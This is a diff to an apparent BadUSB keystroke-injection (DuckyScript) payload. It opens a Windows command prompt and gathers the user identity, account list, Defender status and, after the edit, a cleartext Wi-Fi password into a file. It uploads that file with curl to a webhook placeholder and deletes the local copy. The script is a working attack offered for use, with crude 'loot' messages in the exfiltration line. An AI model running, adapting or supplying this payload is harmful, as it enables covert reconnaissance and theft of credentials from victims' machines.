@@ -1,9 +1,8 @@
-REM Author: SysGerm @ CosmodiumCS
 GUI r
-DELAY 500
+DELAY 100
 STRING C:\Windows\System32\cmd.exe
 ENTER
-DELAY 500
+DELAY 3000
 STRING cd %HOMEPATH%
 ENTER
 STRING whoami > slimmerkimmer.txt
@@ -14,7 +13,7 @@ STRING net users >> slimmerkimmer.txt
 ENTER
 STRING echo --------------------------------------------------- >> slimmerkimmer.txt
 ENTER
-STRING systeminfo >> slimmerkimmer.txt
+STRING netsh wlan show profile WIFI key=clear >> slimmerkimmer.txt
 ENTER
 STRING echo --------------------------------------------------- >> slimmerkimmer.txt
 ENTER
@@ -34,10 +33,9 @@ STRING sc query windefend >> slimmerkimmer.txt
 ENTER
 STRING echo --------------------------------------------------- >> slimmerkimmer.txt
 ENTER
-STRING curl.exe -F "payload_json={\"username\": \"Daddy got that LOOT\", \"content\": \"Get this shit written down\"}" -F "file=@slimmerkimmer.txt" YOUR WEBHOOK
+STRING curl.exe -F "payload_json={\"username\": \"Daddy got that LOOT\", \"content\": \"Get this shit written down\"}" -F "file=@slimmerkimmer.txt" WEBHOOK HERE
 ENTER
 STRING del slimmerkimmer.txt
 ENTER
 STRING exit
 ENTER
-
